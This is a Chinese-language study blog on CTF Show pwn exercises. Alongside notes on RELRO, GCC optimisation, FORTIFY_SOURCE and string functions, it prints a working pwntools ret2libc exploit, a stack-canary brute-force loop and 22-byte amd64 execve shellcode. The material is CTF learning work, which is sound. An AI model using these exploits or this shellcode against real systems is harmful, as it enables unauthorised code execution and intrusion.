---
title: （整理）CTF Show刷题
date: '2025-06-14 16:02:37'
updated: '2025-12-29 10:29:04'
---
# 31
除 canary 都开了，有栈溢出

got 表是 Full relro 的，这说明 got 表不可写，而且在 got 表在程序执行一开始就已经解析了

![](/images/bba35fc4cac4bf47c2e5bf0c32688eb9.png)

但是这里多了一句`mov ebx, [ebp+var_4]`

而程序调用 puts 的时候是从 ebx 来获取 got 表起始地址的，所以需要



```plain
if ( argc > 4 )
    Undefined();
```

这里argc是程序启动时的参数数量

即int __fastcall main<font style="background-color:rgb(247,105,100);">(int argc</font>, const char **argv, const char **envp)

Undefined():

```plain
fgets(flag, 64, v0);
  puts(flag);
```

# GCC的优化策略
之前听说过现在顺便了解一下

| 优化等级 | 优化强度 | 编译时间 | 生成代码大小 | 适用场景 |
| --- | --- | --- | --- | --- |
| -O0 | 无优化 | 最快 | 最大 | 调试阶段 |
| -O1 | 轻度优化 | 快 | 较小 | 开发调试，适度提升性能 |
| -O2 | 中度优化 | 中等 | 较小 | 大多数生产环境，性能平衡 |
| -O3 | 激进优化 | 慢 | 最大 | 高性能计算，极致性能需求 |


1. -O1（一级优化）

  基本优化，开启一些不会显著增加编译时间

  但能提升程序性能的优化

  会移除一些无用代码、做简单的循环展开和常量传播

  编译速度快，生成的代码比不优化版本（-O0）更高效

  适合开发调试阶段稍微优化，兼顾编译时间和性能

2. -O2（二级优化，默认较常用）

  比 -O1 更激进的优化。会启用更多优化技术，比如：

  进一步的循环展开和合并，跳转预测优化，内联函数（Inlining）等

  不会影响程序的正确性，不做可能引起副作用的优化

  适合生产环境中绝大多数情况下的优化，能显著提升性能

  编译时间比 -O1 长，但通常带来更好的性能

3. -O3（三级优化，最高级别）

  开启所有 -O2 的优化，并且进行更激进的优化尝试

  重点是提高性能，不太考虑代码大小

  可能开启：

  函数内联更多、更大范围的循环展开

  向量化（SIMD 指令），代码重排等高成本优化

  可能会使编译时间更长，生成的代码体积更大

  适用于对性能要求极高、可以容忍更长编译时间的场景

下面的FORTIFY_SOURCE在O2和O3都会启用

# FORTIFY_SOURCE
Gcc编译器的一个安全特性，针对字符串和内存操作函数，为了检测和防止缓冲区溢出

会在编译时分析，把一些标准库函数替换成有额外检查的安全版本

主要检查了三个方面：

+ 缓冲区溢出检查：在进行字符串复制或连接操作时，会检查源字符串的长度是否超过了目标缓冲区的大小
+ 格式化字符串检查：在使用格式化字符串函数（如printf，sprintf）时，会检查格式字符串的参数是否与格式化字符串中的占位符匹配
+ 内存操作检查：在进行内存操作时（如memcpy，memset），会检查源和目标内存块的大小是否匹配

FORTIFY_SOURCE=0：

不启用Fortify

```plain
memcpy(buf1, argv[2], v5);
strcpy(buf2, argv[1]);
printf("%s %s\n", buf1, buf2);
```

FORTIFY_SOURCE=1：

检查memcpy和strcpy的参数长度

```plain
__memcpy_chk(buf1, argv[2], v5, 11LL);
__strcpy_chk(buf2, argv[1], 11LL);
printf("%s %s\n", buf1, buf2);
```

FORTIFY_SOURCE=2：

__printf__chk该函数与printf的区别：

1. 对格式化字符串有检查：不能使用 %x$n 不连续地打印，也就是说如果要使用 %3$n，则必须同时使用 %1$n 和 %2$n。在使用 %n 的时候会做一些检查
2. 如果获取的是null则不会打印出来(null)而是直接报错

# Signal函数
用来设置一个函数来处理某些信号，一旦程序发出对应信号就会调用

handler函数

```plain
signal(SIG, (__sighandler_t)handler);
```

SIGABRT(Signal Abort)：程序异常终止

SIGFPE(Signal Floating-Point Exception)：算术运算出错，如除数为 0 或溢出（不一定是浮点运算）

SIGILL(Signal Illegal Instruction)：非法函数映象，如非法指令，通常是由于代码中的某个变体或者尝试执行数据导致的

SIGINT(Signal Interrupt)：中断信号，如 ctrl-C，通常由用户生成

SIGSEGV(Signal Segmentation Violation)：非法访问存储器，如访问不存在的内存单元

SIGTERM(Signal Terminate)：发送给本程序的终止请求信号

# 32位ROP补充
返回地址后接着的是再一个返回地址，然后才是参数

### 32位的ret2libc
才发现没做过32位的ret2libc...

```plain
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.os = 'linux'

# link=process("./45")
elf=ELF("./45")
link=remote("pwn.challenge.ctf.show",28267)

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
ctfshow=elf.symbols['ctfshow']

# gdb.attach(link)
# pause()

payload=b'a'*0x6f+p32(puts_plt)+p32(ctfshow)+p32(puts_got)
link.sendline(payload)
puts_addr=u32(link.recvuntil('\xf7')[-4:].ljust(4,b'\x00'))
libc_base=puts_addr-0x067360
print(hex(libc_base))

system=libc_base+0x03cd10
binsh=libc_base+0x17b8cf
ret=0x08048356
payload=b'a'*0x6f+p32(system)+p32(0)+p32(binsh)+p32(0)+p32(0)
link.send(payload)

link.interactive()
```

写rop时候可以找pop;ret的语句把函数参数跳过再接着rop

函数有几个参数就找pop几个寄存器的，寄存器不能影响到后面的rop链

mprotect参数：

```plain
int mprotect(const void *start, size_t len, int prot);
```

start地址要求0x1000对齐，也就是跟页对齐，申请范围也是

# Canary
公共canary类型的题目爆破：

```plain
canary=b''

for i in range(4):
    for n in range(0xff):
        link=remote("pwn.challenge.ctf.show",28143)
        link.sendline(str(-1))
        payload=b'a'*0x20+canary+p8(n)
        link.sendafter(b'$ ',payload)
        if b'Canary Value Incorrect!' not in link.recv():
            canary+=p8(n)
            success('Canary: '+ hex(u64(canary.ljust(8, b'\x00'))))
            break
        else:
            link.close()

success('Global_Canary: ' + hex(u64(canary.ljust(8, b'\x00'))))
```

# 字符串相关函数
strchr函数：获取字符串第一次出现指定的字符串的位置指针

strcat函数：将两个字符串按顺序合起来

## strcpy和strncpy的区别
strcpy：

```plain
char *strcpy(char *dest, const char *src);
```

将源字符串 src 复制到目标字符串 dest，直到遇到字符串结束符 '\0' 为止

问题：不会检查目标数组 dest 的大小。如果 src 的长度大于 dest 的大小，就会导致缓冲区溢出

strncpy：

```plain
char *strncpy(char *dest, const char *src, size_t n);
```

strncpy 将最多 n 个字符从 src 复制到 dest。如果 src 长度小于 n，strncpy 会用 '\0' 填充剩余空间，直到复制了 n 个字符

问题：如果 src 的长度大于等于 n，strncpy 不会在目标字符串末尾添加 '\0'

# Cyclic
用来准确查找实际的栈溢出偏移：（有些时候IDA的栈偏移是不对的）

1. 先断点在溢出函数
2. 然后用cyclic生成测试字符串

```plain
cyclic 200
```

1. 将测试字符串输入，然后观察返回之后（崩溃之前）的IP寄存器的值

```plain
Invalid address 0x61616167

*EIP  0x61616167 ('gaaa')
```

1. 通过cyclic指令找到偏移

```plain
cyclic -l 'gaaa'
```



找到的22字节的shellcode：（amd64）

```plain
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05

   0:   48 31 f6                        xor    rsi, rsi
   3:   56                              push   rsi
   4:   48 bf 2f 62 69 6e 2f 2f 73 68   movabs rdi, 0x68732f2f6e69622f
   e:   57                              push   rdi
   f:   54                              push   rsp
  10:   5f                              pop    rdi
  11:   b0 3b                           mov    al, 0x3b
  13:   99                              cdq
  14:   0f 05                           syscall
```

遇到shellcode题目IDA没法逆向出来的，可以：

选中call指令再从左上角的edit选到Patch program -> assemble...

不知道有没有快捷键什么的，感觉这样patch挺麻烦的

